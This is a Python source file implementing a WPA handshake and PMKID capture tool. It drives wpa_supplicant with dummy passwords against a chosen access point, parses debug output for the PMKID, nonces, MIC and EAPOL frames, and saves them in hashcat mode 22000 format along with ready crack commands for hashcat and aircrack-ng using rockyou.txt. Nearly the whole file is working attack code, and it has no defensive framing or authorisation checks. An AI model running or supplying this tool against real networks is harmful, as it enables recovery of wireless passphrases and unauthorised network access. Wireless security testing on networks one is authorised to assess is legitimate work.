#!/usr/bin/env python3
"""
WPA Handshake Capture v3
- Universal PMKID detection (all router brands)
- ANonce extraction from EAPOL frames
- Full 4-way handshake reconstruction
- hashcat -m 22000 compatible output
- Works in MANAGED mode with wpa_supplicant (no monitor needed)
"""

import os, re, json, time, subprocess, tempfile, shutil
from pathlib import Path
from datetime import datetime

CAPTURE_DIR = Path(__file__).parent.parent / "data" / "handshakes"
CAPTURE_DIR.mkdir(parents=True, exist_ok=True)


class HandshakeCapture:
    def __init__(self, interface):
        self.interface = interface
        self.captured = {
            "pmkid": None,
            "anonce": None,
            "snonce": None,
            "mic": None,
            "auth_mac": None,
            "supp_mac": None,
            "ssid": None,
            "eapol_frames": [],
        }
        self.output = []
        self.callback = None
        self._ap_bssid = None

    def _log(self, msg):
        self.output.append(msg)
        if self.callback:
            self.callback(msg)

    def _extract_hex(self, line):
        """Extract hex data from any hexdump format.
        Handles ALL known wpa_supplicant output formats:
          hexdump(len=16): XX XX XX ...
          hexdump(len=22): XX XX XX ...
          hexdump[16]: XX XX XX ...
          hexdump[32]:XXXXXX...
        """
        # Format 1: hexdump(len=N):
        m = re.search(r"hexdump\(len=(\d+)\):\s*([0-9a-fA-F ]+)", line)
        if m:
            return int(m.group(1)), m.group(2).strip().replace(" ", "").upper()

        # Format 2: hexdump[N]:
        m = re.search(r"hexdump\[(\d+)\]:\s*([0-9a-fA-F ]+)", line)
        if m:
            return int(m.group(1)), m.group(2).strip().replace(" ", "").upper()

        # Format 3: hexdump[N]:XXXX (no space)
        m = re.search(r"hexdump\[(\d+)\]:([0-9a-fA-F ]+)", line)
        if m:
            return int(m.group(1)), m.group(2).strip().replace(" ", "").upper()

        # Format 4: raw hex after colon (some drivers)
        m = re.search(r":\s*((?:[0-9a-fA-F]{2}\s*){16,})", line)
        if m:
            hex_data = m.group(1).replace(" ", "").upper()
            return len(hex_data) // 2, hex_data

        return None, None

    def _extract_mac(self, line):
        """Extract MAC address from line"""
        m = re.search(r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})", line)
        if m:
            return m.group(1).upper()
        return None

    def _parse_line(self, line):
        """Parse one line from wpa_supplicant debug output.
        Works with ALL router brands (ZTE, TP-Link, Huawei, etc.)"""

        ll = line.lower()

        # ═══════════════════════════════════════
        # PMKID Detection (Universal)
        # ═══════════════════════════════════════
        if "pmkid" in ll and "hexdump" in ll:
            hlen, hdata = self._extract_hex(line)
            if hlen and hdata:
                if hlen == 16 and len(hdata) >= 32:
                    # Direct 16-byte PMKID
                    pmkid = hdata[:32]
                    if self.captured["pmkid"] != pmkid:
                        self.captured["pmkid"] = pmkid
                        self._log(f"[+] PMKID: {pmkid}")

                elif hlen == 22 and len(hdata) >= 44:
                    # 22-byte wrapper: dd 14 00 0f ac 04 <PMKID 16 bytes>
                    pmkid = hdata[12:44]
                    if len(pmkid) == 32 and self.captured["pmkid"] != pmkid:
                        self.captured["pmkid"] = pmkid
                        self._log(f"[+] PMKID (from wrapper): {pmkid}")

                elif hlen >= 16:
                    # Try to find PMKID in longer data
                    clean = re.sub(r"[^0-9A-F]", "", hdata)
                    if len(clean) >= 32:
                        pmkid = clean[:32]
                        if self.captured["pmkid"] != pmkid:
                            self.captured["pmkid"] = pmkid
                            self._log(f"[+] PMKID (extracted): {pmkid}")

        # Get AP MAC from Authenticator line
        if "from authenticator" in ll:
            mac = self._extract_mac(line)
            if mac:
                self.captured["auth_mac"] = mac
                self._ap_bssid = mac

        # ═══════════════════════════════════════
        # ANonce Detection (Improved)
        # ═══════════════════════════════════════
        # Method 1: Direct "ANonce" label
        if "anonce" in ll:
            hlen, hdata = self._extract_hex(line)
            if hdata and len(hdata) >= 64:
                if not self.captured["anonce"]:
                    self.captured["anonce"] = hdata[:64]
                    self._log(f"[+] ANonce: {hdata[:32]}...")

        # Method 2: "Key Replay Counter" followed by ANonce in EAPOL Key frame
        # In wpa_supplicant -dd output, Message 1 shows:
        # "WPA: Key Replay Counter - hexdump(len=8): ..."
        # "WPA: WPA IE - hexdump(len=22): ..."
        # The ANonce is in the EAPOL Key frame between bytes 13-44

        # Method 3: "Nonce" without "S" prefix (some drivers)
        if "nonce" in ll and "anonce" not in ll and "snonce" not in ll and "eapol" in ll:
            hlen, hdata = self._extract_hex(line)
            if hdata and len(hdata) >= 64:
                # Check if this might be ANonce (first nonce from AP)
                if not self.captured["anonce"]:
                    self.captured["anonce"] = hdata[:64]
                    self._log(f"[+] ANonce (from Nonce): {hdata[:32]}...")

        # Method 4: Extract ANonce from raw EAPOL frame
        # EAPOL-Key frame structure (Message 1):
        #   Byte 0-1:   Key Info
        #   Byte 2-3:   Key Length
        #   Byte 4-11:  Key Replay Counter
        #   Byte 12-43: Key Nonce (ANonce for M1, SNonce for M2)
        #   Byte 44-59: Key IV
        #   ...
        # We detect M1 by checking Key Info bits
        if "EAPOL" in line and "Key" in line:
            hlen, hdata = self._extract_hex(line)
            if hdata and len(hdata) >= 90:
                self.captured["eapol_frames"].append(hdata)
                self._log(f"[*] EAPOL Key frame: {len(hdata)//2} bytes")

                # Extract ANonce/SNonce from EAPOL-Key frame
                # EAPOL-Key frame structure (bytes -> hex positions):
                #   Byte 0-1   (hex 0-3):   Protocol Version + Packet Type
                #   Byte 2-3   (hex 4-7):   Body Length
                #   Byte 4     (hex 8-9):   Key Descriptor Type (254=WPA2)
                #   Byte 5-6   (hex 10-13): Key Information (2 bytes)
                #   Byte 7-8   (hex 14-17): Key Length
                #   Byte 9-16  (hex 18-33): Key Replay Counter (8 bytes)
                #   Byte 17-48 (hex 34-97): Key Nonce (32 bytes = ANonce or SNonce)
                #   ...
                #   Byte 77-92 (hex 154-185): Key MIC (16 bytes)
                #
                if len(hdata) >= 98:  # Need at least 49 bytes for Nonce
                    try:
                        # Key Info at hex position 10-13 (byte 5-6)
                        key_info_hex = hdata[10:14]
                        key_info = int(key_info_hex, 16)

                        # Decode Key Info bits
                        pairwise = bool(key_info & 0x0008)
                        ack = bool(key_info & 0x0080)
                        mic_flag = bool(key_info & 0x0100)

                        # Key Nonce at hex position 34-97 (byte 17-48)
                        nonce = hdata[34:98]

                        if len(nonce) >= 64:
                            if pairwise and ack and not mic_flag:
                                # Message 1 from AP (ANonce, MIC=0)
                                if not self.captured["anonce"]:
                                    self.captured["anonce"] = nonce[:64]
                                    self._log(f"[+] ANonce (EAPOL M1): {nonce[:32]}...")
                            elif pairwise and not ack and mic_flag:
                                # Message 2 from STA (SNonce, has MIC)
                                if not self.captured["snonce"]:
                                    self.captured["snonce"] = nonce[:64]
                                    self._log(f"[+] SNonce (EAPOL M2): {nonce[:32]}...")
                            elif pairwise and ack and mic_flag:
                                # Message 3 from AP (ANonce again)
                                if not self.captured["anonce"]:
                                    self.captured["anonce"] = nonce[:64]
                                    self._log(f"[+] ANonce (EAPOL M3): {nonce[:32]}...")

                        # Extract MIC from EAPOL-Key frame
                        # MIC is at byte 77-92 (hex position 154-185)
                        # For 99-byte frames: MIC at hex 98-129
                        # For 121-byte frames: MIC at hex 154-185
                        mic_positions = [(154, 186), (98, 130)]
                        for mp_start, mp_end in mic_positions:
                            if len(hdata) >= mp_end:
                                mic_data = hdata[mp_start:mp_end]
                                if len(mic_data) >= 32 and mic_data != "0" * 32:
                                    if self.captured["mic"] != mic_data[:32]:
                                        self.captured["mic"] = mic_data[:32]
                                        self._log(f"[+] MIC (from frame @byte{mp_start//2}): {mic_data[:32]}...")
                                    break

                    except (ValueError, IndexError) as e:
                        pass  # Skip malformed frames

        # Generic EAPOL hexdump (not Key specific)
        if "eapol" in ll and "hexdump" in ll and "Key" not in line:
            hlen, hdata = self._extract_hex(line)
            if hdata and hlen and hlen >= 95:
                self.captured["eapol_frames"].append(hdata)
                self._log(f"[*] EAPOL frame: {hlen} bytes")

        # ═══════════════════════════════════════
        # SNonce Detection
        # ═══════════════════════════════════════
        if "snonce" in ll:
            hlen, hdata = self._extract_hex(line)
            if hdata and len(hdata) >= 64:
                if not self.captured["snonce"]:
                    self.captured["snonce"] = hdata[:64]
                    self._log(f"[+] SNonce: {hdata[:32]}...")

        # ═══════════════════════════════════════
        # MIC Detection
        # ═══════════════════════════════════════
        if "mic" in ll and "key" in ll and "hexdump" in ll:
            hlen, hdata = self._extract_hex(line)
            if hdata and len(hdata) >= 32:
                self.captured["mic"] = hdata[:32]
                self._log(f"[+] MIC: {hdata[:32]}...")

        # ═══════════════════════════════════════
        # MAC Addresses
        # ═══════════════════════════════════════
        if "authenticator mac" in ll or "aa mac" in ll:
            mac = self._extract_mac(line)
            if mac:
                self.captured["auth_mac"] = mac

        if "supplicant mac" in ll or "spa mac" in ll:
            mac = self._extract_mac(line)
            if mac:
                self.captured["supp_mac"] = mac

        # SSID
        if "ssid:" in ll and not self.captured["ssid"]:
            m = re.search(r"SSID:\s+(.+)", line)
            if m:
                self.captured["ssid"] = m.group(1).strip()

    def capture_pmkid(self, bssid, essid, timeout=20):
        """Fast PMKID capture via wpa_supplicant"""
        self._log(f"PMKID capture: {essid} ({bssid})")
        self._ap_bssid = bssid.upper()

        tmpdir = tempfile.mkdtemp(prefix="pmkid_")
        conf = os.path.join(tmpdir, "wpa.conf")
        with open(conf, "w") as f:
            f.write(f"ctrl_interface={tmpdir}\n")
            f.write("ctrl_interface_group=root\n")
            f.write("network={\n")
            f.write(f'    ssid="{essid}"\n')
            f.write(f"    bssid={bssid}\n")
            f.write('    psk="test12345678"\n')
            f.write("    key_mgmt=WPA-PSK\n")
            f.write("    scan_ssid=1\n")
            f.write("}\n")

        cmd = ["wpa_supplicant", "-ddd", "-Dnl80211,wext",
               f"-i{self.interface}", f"-c{conf}"]

        self._log("Starting wpa_supplicant (max debug)...")

        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1)
        except Exception as e:
            self._log(f"ERROR: {e}")
            shutil.rmtree(tmpdir, ignore_errors=True)
            return self._result("error")

        start = time.time()
        try:
            for line in iter(proc.stdout.readline, ""):
                line = line.rstrip("\n")
                self._parse_line(line)
                if self.captured["pmkid"]:
                    self._log("[+] PMKID captured!")
                    break
                if time.time() - start > timeout:
                    self._log("[!] Timeout")
                    break
        except KeyboardInterrupt:
            self._log("[!] Interrupted")
        finally:
            self._stop_proc(proc)

        result = self._save(bssid, essid)
        shutil.rmtree(tmpdir, ignore_errors=True)
        return result

    def capture_via_connect(self, bssid, essid, timeout=30):
        """Full handshake capture via connection attempt"""
        self._log(f"Handshake capture: {essid} ({bssid})")
        self._ap_bssid = bssid.upper()

        tmpdir = tempfile.mkdtemp(prefix="hs_")
        conf = os.path.join(tmpdir, "wpa.conf")
        with open(conf, "w") as f:
            f.write(f"ctrl_interface={tmpdir}\n")
            f.write("ctrl_interface_group=root\n")
            f.write("update_config=1\n")
            f.write("network={\n")
            f.write(f'    ssid="{essid}"\n')
            f.write(f"    bssid={bssid}\n")
            f.write('    psk="wrongpassword123"\n')
            f.write("    key_mgmt=WPA-PSK\n")
            f.write("    scan_ssid=1\n")
            f.write("}\n")

        cmd = ["wpa_supplicant", "-dd", "-Dnl80211,wext",
               f"-i{self.interface}", f"-c{conf}"]

        self._log("Starting wpa_supplicant (debug)...")

        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1)
        except Exception as e:
            self._log(f"ERROR: {e}")
            shutil.rmtree(tmpdir, ignore_errors=True)
            return self._result("error")

        start = time.time()
        try:
            for line in iter(proc.stdout.readline, ""):
                line = line.rstrip("\n")
                self._parse_line(line)
                ll = line.lower()
                if "key negotiation completed" in ll:
                    self._log("[+] Key negotiation completed!")
                    break
                if "4-way handshake failed" in ll:
                    self._log("[-] 4-Way Handshake failed (expected)")
                    break
                if "wps-timeout" in ll:
                    self._log("[!] WPS Timeout")
                    break
                if time.time() - start > timeout:
                    self._log("[!] Timeout")
                    break
        except KeyboardInterrupt:
            self._log("[!] Interrupted")
        finally:
            self._stop_proc(proc)

        self._analyze()
        result = self._save(bssid, essid)
        shutil.rmtree(tmpdir, ignore_errors=True)
        return result

    def _stop_proc(self, proc):
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass

    def _analyze(self):
        h = self.captured
        self._log("")
        self._log("=" * 50)
        self._log("CAPTURE ANALYSIS")
        self._log("=" * 50)
        self._log(f"PMKID:   {'FOUND' if h['pmkid'] else 'missing'}")
        self._log(f"ANonce:  {'FOUND' if h['anonce'] else 'missing'}")
        self._log(f"SNonce:  {'FOUND' if h['snonce'] else 'missing'}")
        self._log(f"MIC:     {'FOUND' if h['mic'] else 'missing'}")
        self._log(f"AP MAC:  {h['auth_mac'] or 'unknown'}")
        self._log(f"STA MAC: {h['supp_mac'] or 'unknown'}")
        self._log(f"Frames:  {len(h['eapol_frames'])}")

        if h["pmkid"]:
            self._log("")
            self._log("[+] PMKID: Crackable with hashcat -m 22000")
        if h["anonce"] and h["snonce"] and h["mic"]:
            self._log("[+] Full handshake data available!")
        self._log("=" * 50)

    def _save(self, bssid, essid):
        h = self.captured
        result = {
            "status": "failed", "pmkid": h["pmkid"],
            "anonce": h["anonce"], "snonce": h["snonce"],
            "mic": h["mic"], "num_frames": len(h["eapol_frames"]),
            "files": [], "output": "\n".join(self.output[-50:]),
        }

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        sb = bssid.replace(":", "").upper()

        # ── PMKID in hashcat format ──
        if h["pmkid"]:
            pmkid = h["pmkid"]
            aa = sb
            essid_hex = essid.encode().hex()
            sta = (h.get("supp_mac") or "000000000000").replace(":", "").replace("-", "")
            if len(sta) < 12:
                sta = "000000000000"

            hc_line = f"PMKID:{pmkid}*{aa}*{sta}*{essid_hex}"
            fname = CAPTURE_DIR / f"pmkid_{sb}_{ts}.hc22000"
            with open(fname, "w") as f:
                f.write(hc_line + "\n")
            result["files"].append(str(fname))
            result["status"] = "pmkid_captured"

            txt = CAPTURE_DIR / f"pmkid_{sb}_{ts}.txt"
            with open(txt, "w") as f:
                f.write(f"BSSID: {bssid}\nESSID: {essid}\nPMKID: {pmkid}\n\n")
                f.write(f"Hashcat: hashcat -m 22000 {fname} wordlist.txt\n")
                f.write(f"aircrack: aircrack-ng -w wordlist.txt {fname}\n")
            result["files"].append(str(txt))

        # ── Full handshake if we have enough data ──
        if h["anonce"] and h["snonce"] and h["eapol_frames"]:
            mic = h["mic"] or ""
            eapol = "".join(h["eapol_frames"][:4])
            sta = (h.get("supp_mac") or "000000000000").replace(":", "")
            essid_hex = essid.encode().hex()

            if mic and eapol:
                hc = f"WPA*02*{mic}*{sb}*{sta}*{essid_hex}*{h['anonce']}*{h['snonce']}*{eapol}"
                fname = CAPTURE_DIR / f"hs_{sb}_{ts}.hc22000"
                with open(fname, "w") as f:
                    f.write(hc + "\n")
                result["files"].append(str(fname))
                if result["status"] != "pmkid_captured":
                    result["status"] = "handshake_captured"

        # ── Raw JSON ──
        raw = CAPTURE_DIR / f"raw_{sb}_{ts}.json"
        with open(raw, "w") as f:
            json.dump({
                "bssid": bssid, "essid": essid, "ts": ts,
                "pmkid": h["pmkid"], "anonce": h["anonce"],
                "snonce": h["snonce"], "mic": h["mic"],
                "auth_mac": h["auth_mac"], "supp_mac": h["supp_mac"],
                "frames": len(h["eapol_frames"]),
            }, f, indent=2)
        result["files"].append(str(raw))

        # ── Log ──
        logf = CAPTURE_DIR / f"log_{sb}_{ts}.log"
        with open(logf, "w") as f:
            f.write("\n".join(self.output))
        result["files"].append(str(logf))

        return result

    def _result(self, status):
        return {
            "status": status, "pmkid": None, "anonce": None,
            "snonce": None, "mic": None, "num_frames": 0,
            "files": [], "output": "\n".join(self.output[-20:]),
        }


class HandshakeAnalyzer:
    @staticmethod
    def analyze_file(filepath):
        fp = Path(filepath)
        if not fp.exists():
            return {"error": "File not found"}
        r = {"file": str(fp), "format": "", "type": "", "bssid": "",
             "crackable": False, "suggestions": []}
        with open(fp) as f:
            content = f.read().strip()
        if content.startswith("PMKID:"):
            r["format"] = "hc22000"
            r["type"] = "PMKID"
            r["crackable"] = True
            r["suggestions"].append(f"hashcat -m 22000 {fp} wordlist.txt")
            parts = content.split("*")
            if len(parts) >= 2:
                r["bssid"] = ":".join(parts[1][i:i+2] for i in range(0, 12, 2))
        elif content.startswith("WPA*"):
            r["format"] = "hc22000"
            r["type"] = "Full Handshake"
            r["crackable"] = True
            r["suggestions"].append(f"hashcat -m 22000 {fp} wordlist.txt")
        elif fp.suffix == ".json":
            r["format"] = "json"
            r["type"] = "Raw"
            try:
                d = json.loads(content)
                r["bssid"] = d.get("bssid", "")
                r["crackable"] = bool(d.get("pmkid"))
            except Exception:
                pass
        return r

    @staticmethod
    def list_captures():
        caps = []
        for f in sorted(CAPTURE_DIR.glob("*"), key=os.path.getmtime, reverse=True):
            if f.suffix in (".hc22000", ".json", ".txt", ".log", ".cap"):
                a = HandshakeAnalyzer.analyze_file(str(f))
                a["size"] = f.stat().st_size
                a["modified"] = datetime.fromtimestamp(
                    f.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
                caps.append(a)
        return caps

    @staticmethod
    def get_crack_cmd(filepath, wordlist=None):
        a = HandshakeAnalyzer.analyze_file(filepath)
        if not a.get("crackable"):
            return None
        wl = wordlist or "/usr/share/wordlists/rockyou.txt"
        return f"hashcat -m 22000 {filepath} {wl}"
